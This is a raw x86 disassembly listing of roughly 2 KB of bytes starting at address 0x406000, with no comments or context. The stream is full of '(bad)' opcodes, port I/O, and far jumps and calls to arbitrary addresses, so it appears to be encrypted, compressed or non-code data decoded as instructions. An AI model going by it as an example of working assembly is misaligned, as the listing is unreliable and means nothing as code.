  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	int    0x57
  406008:	sub    DWORD PTR ss:[ecx+0x4d7878c2],ecx
  40600f:	jle    0x406089
  406011:	js     0x40601f
  406013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406014:	rcr    DWORD PTR [ebp+0x6e00859e],cl
  40601a:	sub    al,0x95
  40601c:	mov    edx,0xf985d923
  406021:	xchg   BYTE PTR [edi],cl
  406023:	out    dx,al
  406024:	mov    bl,0xd8
  406026:	mov    dl,dh
  406028:	jl     0x40602b
  40602a:	mov    ebx,DWORD PTR [edi]
  40602c:	sahf   
  40602d:	fidiv  DWORD PTR [esi]
  40602f:	rol    BYTE PTR [eax+0x1ce1f2d6],cl
  406035:	xor    BYTE PTR [ebp+0x7afda30d],bl
  40603b:	xchg   ebp,eax
  40603c:	or     DWORD PTR [ecx],edi
  40603e:	enter  0xfa4a,0x55
  406042:	lock jge 0x406004
  406045:	dec    esp
  406046:	popf   
  406047:	mov    dh,0x4c
  406049:	sub    eax,0x9293dad9
  40604e:	xchg   DWORD PTR ds:0xed40ba35,edi
  406054:	dec    ebp
  406055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406056:	xor    eax,0xc3bab4c0
  40605b:	rcl    DWORD PTR [ebx-0x3ff1cab5],1
  406061:	or     BYTE PTR [ebp-0x52da2913],dl
  406067:	or     eax,DWORD PTR [ecx-0x5f667603]
  40606d:	cld    
  40606e:	cmp    DWORD PTR [ecx+edx*8-0x83982cf],0xe177ab11
  406079:	inc    ebx
  40607a:	sbb    DWORD PTR [ecx+0x40],0xffffffe8
  40607e:	pcmpgtw mm1,QWORD PTR [ebp-0x158b7258]
  406085:	jmp    0x8ffa086
  40608a:	inc    edx
  40608b:	jb     0x406073
  40608d:	or     bl,BYTE PTR [ecx+0x78]
  406090:	inc    ebx
  406091:	jne    0x4060b9
  406093:	sbb    DWORD PTR [esi-0x2b],ebp
  406096:	inc    ebx
  406097:	std    
  406098:	sbb    ecx,edx
  40609a:	scas   al,BYTE PTR es:[edi]
  40609b:	cmp    cl,BYTE PTR [edx]
  40609d:	enter  0xace1,0x49
  4060a1:	lods   eax,DWORD PTR ds:[esi]
  4060a2:	mov    esp,0xa1341f72
  4060a7:	aaa    
  4060a8:	imul   eax,DWORD PTR [edi+0x2e310e7a],0x133572e0
  4060b2:	pop    ss
  4060b3:	xor    BYTE PTR [edi],bl
  4060b5:	dec    edx
  4060b6:	pop    ss
  4060b7:	xor    DWORD PTR [ebp+0x2f966143],edx
  4060bd:	dec    edi
  4060be:	mov    ebx,0x22cd43
  4060c3:	jbe    0x406076
  4060c5:	ja     0x4060a0
  4060c7:	or     esp,ebx
  4060c9:	mov    WORD PTR [eax+0x3e],ss
  4060cc:	push   eax
  4060cd:	dec    eax
  4060ce:	popf   
  4060cf:	lods   al,BYTE PTR ds:[esi]
  4060d0:	sbb    DWORD PTR [edx-0x50efcb84],ecx
  4060d6:	mov    ecx,0x43dd4087
  4060db:	xor    ch,BYTE PTR [edx]
  4060dd:	pop    edi
  4060de:	or     ebx,esi
  4060e0:	sub    edi,ecx
  4060e2:	xchg   ecx,eax
  4060e3:	jb     0x40614c
  4060e5:	(bad)  [edx-0x550805e7]
  4060eb:	and    esp,DWORD PTR [edi+0x10]
  4060ee:	sub    BYTE PTR [esi+0xf],dl
  4060f1:	cs add ah,bh
  4060f4:	ja     0x4060e7
  4060f6:	aaa    
  4060f7:	leave  
  4060f8:	(bad)  
  4060f9:	into   
  4060fa:	fs jmp 0xd5e70649
  406100:	addr16 pop ecx
  406102:	and    BYTE PTR [edi],ch
  406104:	aas    
  406105:	gs int3 
  406107:	call   0x3d430bcd
  40610c:	lahf   
  40610d:	adc    al,0x58
  40610f:	adc    BYTE PTR [ecx+0x7fa4917],ah
  406115:	or     eax,0x75a702e4
  40611a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40611b:	aad    0x3e
  40611d:	xor    BYTE PTR [ebx],ch
  40611f:	jmp    0x99d0:0xec04d1e0
  406126:	mov    al,ds:0x3b5e593d
  40612b:	xchg   esi,eax
  40612c:	imul   ebx,DWORD PTR [ebp+0x5db4fb68],0x85c560cb
  406136:	(bad)  
  406137:	lods   eax,DWORD PTR ds:[esi]
  406138:	add    cl,dl
  40613a:	mov    dl,0xc5
  40613c:	sub    bh,BYTE PTR [eax+0x7f]
  40613f:	pushw  es
  406141:	leave  
  406142:	hlt    
  406143:	cmp    eax,0xc0c2a02d
  406148:	es addr16 int3 
  40614b:	or     ch,cl
  40614d:	push   ds
  40614e:	scas   eax,DWORD PTR es:[edi]
  40614f:	mov    al,0xb5
  406151:	cli    
  406152:	lods   eax,DWORD PTR ds:[esi]
  406153:	ins    DWORD PTR es:[edi],dx
  406154:	mov    eax,0xa6adbfa7
  406159:	sbb    DWORD PTR [ebp-0x33],esp
  40615c:	dec    ecx
  40615d:	(bad)  
  40615e:	int3   
  40615f:	fs out 0x56,al
  406162:	nop
  406163:	cmc    
  406164:	enter  0x9593,0x6c
  406168:	mov    al,bl
  40616a:	pop    ebx
  40616b:	in     eax,dx
  40616c:	xchg   edi,eax
  40616d:	pusha  
  40616e:	daa    
  40616f:	dec    esp
  406170:	lahf   
  406171:	fimul  DWORD PTR [ebx+0x1e6ea40]
  406177:	(bad)  
  406178:	adc    ah,cl
  40617a:	push   esp
  40617b:	dec    esp
  40617c:	mov    ebp,0x8ad8a4ac
  406181:	jbe    0x40615a
  406183:	cmp    eax,0xa83aca4e
  406188:	adc    BYTE PTR ds:0xa153f6b7,ah
  40618e:	call   0x918c:0xcc339c04
  406195:	jo     0x4061a6
  406197:	sti    
  406198:	ret    0xd686
  40619b:	jmp    0x36d6:0x826f3977
  4061a2:	sbb    dl,BYTE PTR [esi+0x75ab0dca]
  4061a8:	mov    edi,0x372bd798
  4061ad:	xchg   dh,dl
  4061af:	sub    bh,BYTE PTR [ebx+0x5b]
  4061b2:	xor    dh,al
  4061b4:	sub    DWORD PTR [ebx],ebx
  4061b6:	mov    ah,0xa0
  4061b8:	int3   
  4061b9:	jns    0x406183
  4061bb:	xlat   BYTE PTR ds:[ebx]
  4061bc:	ror    BYTE PTR [edx+0x3a],1
  4061bf:	(bad)
  4061c3:	pop    edi
  4061c4:	adc    esp,DWORD PTR [esi-0x1b657784]
  4061ca:	leave  
  4061cb:	loop   0x4061bf
  4061cd:	pop    ds
  4061ce:	push   ds
  4061cf:	std    
  4061d0:	sub    al,0x4e
  4061d2:	xchg   DWORD PTR [esi+esi*1+0x31cc7fc9],ebx
  4061d9:	jmp    0x406217
  4061db:	loopne 0x4061a2
  4061dd:	add    BYTE PTR [ecx],ah
  4061df:	ret    0x72df
  4061e2:	cdq    
  4061e3:	sbb    eax,0xc3236d44
  4061e8:	mov    eax,ds:0xfd56558b
  4061ed:	inc    eax
  4061ee:	iret   
  4061ef:	sub    dl,dl
  4061f1:	into   
  4061f2:	sti    
  4061f3:	outs   dx,BYTE PTR ds:[esi]
  4061f4:	cdq    
  4061f5:	xchg   ecx,eax
  4061f6:	das    
  4061f7:	repnz push ds
  4061f9:	inc    edx
  4061fa:	xchg   edi,eax
  4061fb:	sub    BYTE PTR [eax],al
  4061fd:	outs   dx,BYTE PTR ds:[esi]
  4061fe:	call   0x6ce6:0x9f7e65ae
  406205:	outs   dx,BYTE PTR ds:[esi]
  406206:	cs add al,ah
  406209:	out    dx,al
  40620a:	dec    ebp
  40620b:	sbb    eax,DWORD PTR [ebp+0x1f5d620a]
  406211:	fidivr WORD PTR [eax]
  406213:	pop    eax
  406214:	sbb    ah,dl
  406216:	or     eax,0x7d93af
  40621b:	(bad)  
  40621c:	out    dx,al
  40621d:	cmc    
  40621e:	xchg   ecx,eax
  40621f:	mov    ebx,DWORD PTR [edx+0x4d5fcdb2]
  406225:	fwait
  406226:	imul   ebp,DWORD PTR [edx+0x6f1b2d17],0x28
  40622d:	add    al,0x9d
  40622f:	sbb    eax,0xac65b359
  406234:	stc    
  406235:	dec    eax
  406236:	push   eax
  406237:	retf   0xdb10
  40623a:	jbe    0x40620d
  40623c:	lock shl BYTE PTR [eax+0x43f2fbd8],1
  406243:	(bad)  
  406244:	gs sub ch,bl
  406247:	pop    esi
  406248:	loop   0x406220
  40624a:	and    esi,DWORD PTR [ecx+ebp*8+0x2b4fd9c1]
  406251:	push   cs
  406252:	sub    DWORD PTR [edi+0x4dcec99],edx
  406258:	or     eax,0x880fc88
  40625d:	mul    BYTE PTR [edi]
  40625f:	fwait
  406260:	or     al,0x69
  406262:	xlat   BYTE PTR ds:[ebx]
  406263:	retf   
  406264:	xchg   DWORD PTR [ebp+0x12],esp
  406267:	hlt    
  406268:	and    al,0x72
  40626a:	popa   
  40626b:	pop    ebx
  40626c:	(bad)  
  40626d:	int    0xa5
  40626f:	push   edi
  406270:	int3   
  406271:	in     eax,dx
  406272:	in     eax,0x3f
  406274:	popa   
  406275:	mov    ds:0xaafc5026,eax
  40627a:	sbb    ah,BYTE PTR [ebx+edi*4+0x26580425]
  406281:	jmp    0xbf1256ee
  406286:	pop    esi
  406287:	in     al,0x4a
  406289:	mov    edi,0xb6b16bad
  40628e:	cmp    DWORD PTR [edx+0xe],edi
  406291:	jb     0x4062bb
  406293:	setb   BYTE PTR ds:0xf9685b6
  40629a:	mov    dl,0xd7
  40629c:	lock scas eax,DWORD PTR es:[edi]
  40629e:	fdiv   st(3),st
  4062a0:	stc    
  4062a1:	ror    BYTE PTR [edi],cl
  4062a3:	push   esp
  4062a4:	jp     0x406243
  4062a6:	jns    0x4062d5
  4062a8:	cmc    
  4062a9:	sub    BYTE PTR [edi+0x18],bl
  4062ac:	xor    bh,dl
  4062ae:	adc    bl,BYTE PTR [eax+ebp*4-0x64]
  4062b2:	ja     0x406243
  4062b4:	mov    edi,0x7adeafd8
  4062b9:	mov    WORD PTR [esi+0x59e4365b],?
  4062bf:	arpl   WORD PTR [ebx+0x1d862de0],ax
  4062c5:	push   ds
  4062c6:	pop    ecx
  4062c7:	aad    0x6f
  4062c9:	mov    dh,0x47
  4062cb:	dec    ecx
  4062cc:	mov    al,BYTE PTR [ebx]
  4062ce:	cwde   
  4062cf:	in     eax,0xc0
  4062d1:	and    esp,DWORD PTR [ebp+0x78033e1d]
  4062d7:	or     al,0x5e
  4062d9:	repz mov dh,BYTE PTR [edx+0x2c]
  4062dd:	test   al,0x6d
  4062df:	jbe    0x406323
  4062e1:	sbb    BYTE PTR [edx-0x11],dl
  4062e4:	dec    ecx
  4062e5:	div    ecx
  4062e7:	mov    ecx,DWORD PTR [ebp+0x10]
  4062ea:	jmp    0x4065da
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0x5f745f5c
  4062fe:	sbb    dh,0xc7
  406301:	js     0x40637b
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x40628d
  406308:	in     eax,0xc5
  40630a:	add    edi,DWORD PTR [esi+edx*4-0x78740781]
  406311:	cmp    al,0xd8
  406313:	retf   0x5530
  406316:	push   edx
  406317:	dec    edx
  406318:	cmp    BYTE PTR [edx+0x20],ah
  40631b:	xor    ecx,0x77
  40631e:	sub    BYTE PTR [esi],0xcf
  406321:	add    ecx,DWORD PTR [edi+eiz*1-0x4b3fdbee]
  406328:	dec    edi
  406329:	push   cs
  40632a:	repz mov ebp,0x3e4c2126
  406330:	loopne 0x4062bf
  406332:	inc    ebp
  406333:	inc    ecx
  406334:	pop    ebx
  406335:	es dec edi
  406337:	aam    0x50
  406339:	inc    ebp
  40633a:	add    DWORD PTR [edx],ecx
  40633c:	xchg   DWORD PTR [edx-0x4e320385],eax
  406342:	cmp    esp,DWORD PTR [eax-0x532e3ce8]
  406348:	stos   DWORD PTR es:[edi],eax
  406349:	push   ebp
  40634a:	fdivr  QWORD PTR [esi]
  40634c:	cmp    ch,BYTE PTR [ebx+0x6f]
  40634f:	cmp    al,0x48
  406351:	bound  ebp,QWORD PTR fs:[eax+0x2a55b511]
  406358:	xchg   ecx,eax
  406359:	sar    DWORD PTR [edi+0x24161166],cl
  40635f:	fisubr DWORD PTR [ebp-0x9]
  406362:	adc    al,0xd3
  406364:	mov    ch,0xa1
  406366:	xor    ecx,esp
  406368:	adc    al,0x4a
  40636a:	iret   
  40636b:	hlt    
  40636c:	and    ebx,edx
  40636e:	pop    ss
  40636f:	test   BYTE PTR [edx+0x7d],bl
  406372:	xchg   esi,eax
  406373:	out    dx,eax
  406374:	add    esp,edx
  406376:	xchg   edx,eax
  406377:	sub    al,0xbe
  406379:	dec    edi
  40637a:	rcl    DWORD PTR [edi+0x6761fdbe],cl
  406380:	xchg   edx,eax
  406381:	aas    
  406382:	mov    esi,0x9c21ffdd
  406387:	adc    DWORD PTR [eax-0x7fcf2e02],eax
  40638d:	sub    DWORD PTR [edx+eax*1+0x51c23287],0x3e
  406395:	or     ecx,DWORD PTR [edx]
  406397:	not    DWORD PTR [eax]
  406399:	lods   eax,DWORD PTR ds:[esi]
  40639a:	inc    eax
  40639b:	dec    eax
  40639c:	mov    ebx,0xf86859d8
  4063a1:	push   eax
  4063a2:	(bad)  
  4063a3:	mov    dh,0x76
  4063a5:	push   esp
  4063a6:	or     eax,0x5c9bdcbf
  4063ab:	mov    dh,0x22
  4063ad:	(bad)  
  4063ae:	jne    0x406350
  4063b0:	outs   dx,DWORD PTR ds:[esi]
  4063b1:	jecxz  0x4063c3
  4063b3:	jo     0x4063e1
  4063b5:	test   BYTE PTR [edi],al
  4063b7:	aad    0x37
  4063b9:	lsl    ebx,WORD PTR [ecx+0x1a]
  4063bd:	sbb    edi,DWORD PTR [ecx+0x46]
  4063c0:	out    0x3d,eax
  4063c2:	pushf  
  4063c3:	es and cl,ah
  4063c6:	jmp    0x2756:0x2a41b413
  4063cd:	jbe    0x40644b
  4063cf:	push   cs
  4063d0:	jmp    0xc38f668a
  4063d5:	enter  0x9d6,0x5b
  4063d9:	test   DWORD PTR [ecx-0x58],edx
  4063dc:	pop    ebx
  4063dd:	add    esi,edx
  4063df:	push   esi
  4063e0:	sar    ecx,0xcc
  4063e3:	call   0x1e42f6b6
  4063e8:	jno    0x40637c
  4063ea:	ds xchg ebp,eax
  4063ec:	adc    BYTE PTR [edx+0x54],dl
  4063ef:	dec    edx
  4063f0:	jmp    0x4063fd
  4063f2:	and    eax,0x860f14c4
  4063f7:	xor    BYTE PTR [ecx],0xf1
  4063fa:	fwait
  4063fb:	adc    DWORD PTR ds:0x277950ca,ebp
  406401:	sub    eax,0x713006b3
  406406:	test   al,0x51
  406408:	sbb    eax,0xd8ee5e8b
  40640d:	das    
  40640e:	push   ds
  40640f:	popa   
  406410:	jns    0x4063b3
  406412:	or     BYTE PTR [ecx+0x36],0xa2
  406416:	adc    BYTE PTR [ebx-0x61],dl
  406419:	push   0xfffffff6
  40641b:	inc    eax
  40641c:	lods   al,BYTE PTR ds:[esi]
  40641d:	(bad)  
  40641f:	pop    edi
  406420:	mov    cl,0x6a
  406422:	aad    0x34
  406424:	sbb    eax,DWORD PTR [eax+0x5e]
  406427:	lea    ecx,[eax-0x3c716109]
  40642d:	cld    
  40642e:	xchg   ebp,eax
  40642f:	leave  
  406430:	xor    eax,0x9bedad6a
  406435:	push   ebx
  406436:	push   edi
  406437:	test   eax,0x28d87df4
  40643c:	sar    ebp,1
  40643e:	xor    eax,0xf32f8cd2
  406443:	inc    ecx
  406444:	pop    esi
  406445:	cmp    al,0xb6
  406447:	jmp    0x68dd:0x839bcbc4
  40644e:	fdivr  QWORD PTR [edx+0x61]
  406451:	and    al,0xd9
  406453:	std    
  406454:	mov    DWORD PTR [ebx-0x3629024e],edx
  40645a:	sbb    DWORD PTR [ecx],eax
  40645c:	push   ebx
  40645d:	arpl   WORD PTR [edx+edx*2-0x48],dx
  406461:	out    0xfd,al
  406463:	push   cs
  406464:	std    
  406465:	jmp    0x9df7:0x828c5cb3
  40646c:	adc    eax,0xe4a94c24
  406471:	xchg   esp,eax
  406472:	mov    esi,0xf759cf87
  406477:	inc    eax
  406478:	fidivr DWORD PTR [ebx+0x3a]
  40647b:	xor    edi,DWORD PTR [edx]
  40647d:	jb     0x40641c
  40647f:	inc    eax
  406480:	fst    DWORD PTR [eax-0x6b]
  406483:	push   ds
  406484:	jae    0x406441
  406486:	xchg   edx,eax
  406487:	sbb    eax,0x17fd9372
  40648c:	mov    bl,0xc9
  40648e:	mov    cl,0xc7
  406490:	inc    ebx
  406491:	push   0x4af03d57
  406496:	js     0x4064ad
  406498:	inc    edx
  406499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40649a:	in     al,dx
  40649b:	mov    ch,0x67
  40649d:	cmp    DWORD PTR [ebp-0x3a5e784b],ebp
  4064a3:	mov    eax,ds:0x5dcb20ac
  4064a8:	push   edx
  4064a9:	aas    
  4064aa:	imul   ebx,DWORD PTR [esi-0x12],0x7d
  4064ae:	lods   al,BYTE PTR ds:[esi]
  4064af:	jmp    0x4064a6
  4064b1:	sub    ax,0x377f
  4064b5:	and    eax,0xc89dd05d
  4064ba:	ins    BYTE PTR es:[edi],dx
  4064bb:	mov    al,ds:0x3330525d
  4064c0:	cld    
  4064c1:	cmp    DWORD PTR [edx-0x585d0611],ebx
  4064c7:	mov    ebx,0x33e524e4
  4064cc:	adc    edi,edi
  4064ce:	xchg   esi,eax
  4064cf:	sbb    BYTE PTR [eax+0x4b296227],bl
  4064d5:	imul   edi,DWORD PTR [esi],0x39af1a51
  4064db:	mov    eax,ds:0xf7a3c701
  4064e0:	ds jle 0x406480
  4064e3:	xchg   esp,eax
  4064e4:	dec    ecx
  4064e5:	(bad)  
  4064e6:	push   ebp
  4064e7:	mov    eax,0xc17b2c4
  4064ec:	inc    edi
  4064ed:	stos   DWORD PTR es:[edi],eax
  4064ee:	pop    ss
  4064ef:	fidivr WORD PTR [ebp+0x78]
  4064f2:	scas   eax,DWORD PTR es:[edi]
  4064f3:	sbb    al,0x3d
  4064f5:	push   cs
  4064f6:	adc    al,0xb
  4064f8:	jo     0x4064b1
  4064fa:	stc    
  4064fb:	ss ja  0x40655f
  4064fe:	loopne 0x40650f
  406500:	arpl   WORD PTR [ecx+0x55a86380],ax
  406506:	mov    ebp,0xf862edc4
  40650b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40650c:	enter  0x1368,0x77
  406510:	ins    BYTE PTR es:[edi],dx
  406511:	nop
  406512:	and    ebx,DWORD PTR [eax]
  406514:	imul   esi,DWORD PTR [eax-0x5c5aa2a0],0x3c
  40651b:	imul   edx,DWORD PTR [eax-0x1e786c1b],0xffffffce
  406522:	cmp    eax,0x41495944
  406527:	add    DWORD PTR [edx+0x33],0x20024b32
  40652e:	xor    dh,bh
  406530:	nop
  406531:	ja     0x406552
  406533:	pop    edi
  406534:	cmp    al,0xc3
  406536:	popf   
  406537:	add    al,0x1c
  406539:	aad    0xfb
  40653b:	pop    es
  40653c:	fld    TBYTE PTR [esi+0x59]
  40653f:	inc    ebp
  406540:	ja     0x4065a0
  406542:	(bad)  
  406543:	push   DWORD PTR [ebp-0x479bb195]
  406549:	adc    BYTE PTR [eax+edx*8+0x5ac5e530],dh
  406550:	sbb    BYTE PTR [esi],ch
  406552:	in     eax,dx
  406553:	jmp    0x1eaf3dbf
  406558:	cs pop ecx
  40655a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40655b:	inc    ecx
  40655c:	and    BYTE PTR [ecx-0x45],0xa3
  406560:	test   BYTE PTR [ecx+eiz*8],ch
  406563:	pop    ebx
  406564:	icebp  
  406565:	test   BYTE PTR [ebx],al
  406567:	into   
  406568:	scas   eax,DWORD PTR es:[edi]
  406569:	dec    eax
  40656a:	push   ecx
  40656b:	sbb    eax,0xd3b3fed6
  406570:	repnz cwde 
  406572:	test   al,0xa7
  406574:	mov    ah,0x4a
  406576:	inc    esp
  406577:	rcl    BYTE PTR [esi+0x49],cl
  40657a:	inc    ebp
  40657b:	cmp    DWORD PTR [eax-0x759c2b15],edx
  406581:	mov    edi,0x69ef1577
  406586:	mov    dh,dh
  406588:	pop    ecx
  406589:	sahf   
  40658a:	ror    BYTE PTR [edi],cl
  40658c:	push   ds
  40658d:	mov    esi,0x340ca2d4
  406592:	ret    0xbe00
  406595:	outs   dx,DWORD PTR ds:[esi]
  406596:	jns    0x406574
  406598:	add    BYTE PTR [edi+ebp*2-0x3],dh
  40659c:	jae    0x4065e3
  40659e:	bound  ecx,QWORD PTR [esi+0xa]
  4065a1:	fdivp  st(3),st
  4065a3:	int    0x43
  4065a5:	and    eax,0x350c4c5
  4065aa:	daa    
  4065ab:	jl     0x40655d
  4065ad:	(bad)  
  4065af:	mov    dh,0xda
  4065b1:	sub    BYTE PTR [esi+0xf56f540],bh
  4065b7:	call   0xa0e3df52
  4065bc:	xor    dl,cl
  4065be:	nop
  4065bf:	scas   al,BYTE PTR es:[edi]
  4065c0:	sbb    ecx,esp
  4065c2:	mov    ebp,0x21785e8b
  4065c7:	fdivr  DWORD PTR [eax+0x48]
  4065ca:	test   al,0x1f
  4065cc:	mov    esi,0x1804922a
  4065d1:	jge    0x4065fe
  4065d3:	(bad)  
  4065d4:	aam    0x6e
  4065d6:	aam    0xdb
  4065d8:	test   eax,eax
  4065da:	and    ecx,eax
  4065dc:	or     ecx,0x81161d8e
  4065e2:	mov    eax,ecx
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	add    edi,DWORD PTR [ebx-0x70]
  4065f8:	push   ecx
  4065f9:	xor    eax,esp
  4065fb:	js     0x406675
  4065fd:	dec    ebp
  4065fe:	jle    0x406678
  406600:	js     0x4065d0
  406602:	mov    esi,0x529ca08f
  406607:	xor    eax,0x6562c545
  40660c:	mov    bl,0xc
  40660e:	xor    DWORD PTR [edi],ecx
  406610:	dec    ebp
  406611:	cmp    dl,BYTE PTR [eax+0x56322ef6]
  406617:	jl     0x40662b
  406619:	push   eax
  40661a:	int    0xd9
  40661c:	xchg   esp,eax
  40661d:	and    eax,0xda34207
  406622:	(bad)  
  406623:	or     al,BYTE PTR [eax+0x7f]
  406626:	std    
  406627:	outs   dx,BYTE PTR ds:[esi]
  406628:	sbb    ah,BYTE PTR [eax]
  40662a:	je     0x40664c
  40662c:	mov    esi,0x8dac53e
  406631:	mov    ebp,DWORD PTR [edi*2+0x53f38e63]
  406638:	shl    DWORD PTR [eax+0x4e6b84b4],cl
  40663e:	mov    ch,0x3b
  406640:	mov    ds:0x471f031a,al
  406645:	adc    al,0x26
  406647:	(bad)  
  406649:	mov    esi,0x19e523b9
  40664e:	stc    
  40664f:	dec    esi
  406650:	repz imul edx,DWORD PTR [edx]
  406654:	call   0x408b:0xa456d53c
  40665b:	gs cli 
  40665d:	das    
  40665e:	jg     0x4066b7
  406660:	mov    al,bh
  406662:	pop    ebx
  406663:	mov    esi,0xab0d0841
  406668:	lea    eax,[eax+ebp*4+0x65645ac4]
  40666f:	cmp    bl,BYTE PTR [ecx-0x7c]
  406672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406673:	stos   BYTE PTR es:[edi],al
  406674:	pushf  
  406675:	pop    es
  406676:	push   esi
  406677:	pusha  
  406678:	loop   0x406614
  40667a:	scas   al,BYTE PTR es:[edi]
  40667b:	test   BYTE PTR [ebx-0x27],bl
  40667e:	cmp    al,0x67
  406680:	push   es
  406681:	retf   0xbb03
  406684:	inc    ebx
  406685:	sbb    BYTE PTR [ebp+0x65],ch
  406688:	std    
  406689:	push   0xa
  40668b:	xchg   ebx,eax
  40668c:	clc    
  40668d:	ja     0x406612
  40668f:	inc    edi
  406690:	mov    ecx,0x4b9c3d3
  406695:	xor    ebp,DWORD PTR [edi-0x48]
  406698:	(bad)  
  406699:	neg    DWORD PTR [esi-0x45]
  40669c:	mov    esi,0xe14c2e01
  4066a1:	pop    eax
  4066a2:	dec    ebx
  4066a3:	mov    es,WORD PTR [esi]
  4066a5:	mov    BYTE PTR [edi-0x53d5e780],bh
  4066ab:	sbb    eax,0x7f7d7172
  4066b0:	shl    BYTE PTR ds:0x9c9b38f2,1
  4066b6:	clc    
  4066b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066b8:	lds    ebp,FWORD PTR [eax-0x5f1ab910]
  4066be:	ret    0xb9dd
  4066c1:	(bad)  
  4066c2:	cwde   
  4066c3:	aam    0x92
  4066c5:	je     0x40667d
  4066c7:	mov    eax,ds:0x34b7bce7
  4066cc:	cdq    
  4066cd:	out    dx,al
  4066ce:	daa    
  4066cf:	adc    edx,DWORD PTR [ebp+0x42f52b19]
  4066d5:	stos   BYTE PTR es:[edi],al
  4066d6:	push   0x24968966
  4066db:	fwait
  4066dc:	test   al,0xa0
  4066de:	and    ch,BYTE PTR [edi+0x227e141a]
  4066e4:	mov    ds:0x1c875507,al
  4066e9:	aas    
  4066ea:	retf   
  4066eb:	shl    BYTE PTR [edi+eiz*8+0x18],0xa9
  4066f0:	pop    ss
  4066f1:	cmp    eax,0x1e447716
  4066f6:	ret    
  4066f7:	jnp    0x406710
  4066f9:	not    BYTE PTR [esi+0x28]
  4066fc:	in     al,0x73
  4066fe:	and    edi,DWORD PTR [eax-0x70]
  406701:	push   0xf8825264
  406706:	push   edi
  406707:	cmp    DWORD PTR [ebp+0x73],esi
  40670a:	push   esi
  40670b:	push   edx
  40670c:	push   ebp
  40670d:	rcr    DWORD PTR [ecx-0x1abc354b],cl
  406713:	mov    ebp,0x1e14460d
  406718:	pop    edx
  406719:	or     dl,BYTE PTR [ecx+0x440d1d1]
  40671f:	mov    ?,WORD PTR [edx+0x48]
  406722:	mov    ch,0x3
  406724:	add    al,0xf7
  406726:	or     al,0x57
  406728:	out    dx,eax
  406729:	frstor [esi+ebx*8+0x116b254f]
  406730:	jmp    DWORD PTR [ebp+ecx*1+0x58]
  406734:	rcl    DWORD PTR [ebx],1
  406736:	ss mov esi,eax
  406739:	mov    al,ds:0x72b9be76
  40673e:	adc    dl,ch
  406740:	call   0x6e84:0x7793f1f8
  406747:	and    ch,BYTE PTR [esi+0x6e]
  40674a:	xlat   BYTE PTR ds:[ebx]
  40674b:	sbb    eax,0xb6056a56
  406750:	cmp    ah,BYTE PTR [eax-0x1d6735b1]
  406756:	inc    esp
  406757:	jmp    0xa6c:0xeab2f7e6
  40675e:	xchg   DWORD PTR [edx+0x49fc98e8],esi
  406764:	sub    DWORD PTR [eax-0x78],ecx
  406767:	sub    ebp,DWORD PTR [ebp-0x1e]
  40676a:	jne    0x4067dd
  40676c:	jge    0x406736
  40676e:	leave  
  40676f:	jno    0x4066f4
  406771:	in     al,dx
  406772:	daa    
  406773:	sti    
  406774:	pop    ebx
  406775:	lods   eax,DWORD PTR ds:[esi]
  406776:	add    al,0xe
  406778:	sbb    eax,0xf24c4593
  40677d:	dec    ebp
  40677e:	lea    ebx,[ecx-0x4a]
  406781:	or     DWORD PTR [edx-0x33],edx
  406784:	mov    ch,0xc9
  406786:	cmp    edi,DWORD PTR [edi]
  406788:	sub    ebp,DWORD PTR ds:0x847f6af
  40678e:	mov    bl,0x84
  406790:	add    BYTE PTR [edi],bl
  406792:	dec    edi
  406793:	adc    dl,BYTE PTR [ebx+0x6ffcb519]
  406799:	cld    
  40679a:	hlt    
  40679b:	pusha  
  40679c:	push   cs
  40679d:	into   
  40679e:	int3   
  40679f:	fcmovnb st,st(1)
  4067a1:	jae    0x40678e
  4067a3:	add    al,0x6a
  4067a5:	sub    ebx,ebx
  4067a7:	sbb    BYTE PTR [ebx],0x41
  4067aa:	cmp    eax,0xe03810b4
  4067af:	or     DWORD PTR [ebx+0x41],eax
  4067b2:	cld    
  4067b3:	adc    DWORD PTR [edx],esi
  4067b5:	adc    bh,BYTE PTR [ebx+0x3e07dc6]
  4067bb:	jnp    0x4067e0
  4067bd:	cld    
  4067be:	push   0x560233fd
  4067c3:	shr    BYTE PTR gs:[bp+di-0x46],cl
  4067c8:	sti    
  4067c9:	mov    eax,0xd9b8713a
  4067ce:	cld    
  4067cf:	call   0x6f27:0x844a85e0
  4067d6:	xchg   ebx,eax
  4067d7:	jle    0x40681c
  4067d9:	sti    
  4067da:	push   0x7776c22e
  4067df:	loopne 0x4067fe
  4067e1:	lods   al,BYTE PTR ds:[esi]
  4067e2:	jns    0x40684c
  4067e4:	int    0x6d
  4067e6:	cmp    eax,0x793a9ddb
  4067eb:	(bad)  
  4067ec:	add    BYTE PTR [edi+0xc8f6a38],0x1b
  4067f3:	test   al,0x40
  4067f5:	mov    esp,0x54c23892
  4067fa:	lods   eax,DWORD PTR ds:[esi]
  4067fb:	pop    ss
  4067fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067fd:	mov    dl,0x91
  4067ff:	pushf  
  406800:	int    0x89
  406802:	mov    DWORD PTR [edx+edx*4],edi
  406805:	dec    edx
  406806:	mov    eax,0x1d7e4f54
  40680b:	xchg   esi,eax
  40680c:	or     bl,BYTE PTR [ecx-0x77]
  40680f:	fcmovnb st,st(7)
  406811:	mov    BYTE PTR [ecx+0x6d],cl
  406814:	test   al,0xd4
  406816:	pop    ebp
  406817:	jle    0x4067ce
  406819:	int    0x7b
  40681b:	push   eax
  40681c:	add    DWORD PTR [esi+0x3db10143],eax
  406822:	test   al,0xb9
  406824:	pusha  
  406825:	dec    ebx
  406826:	fmul   QWORD PTR [edx+esi*8-0x75]
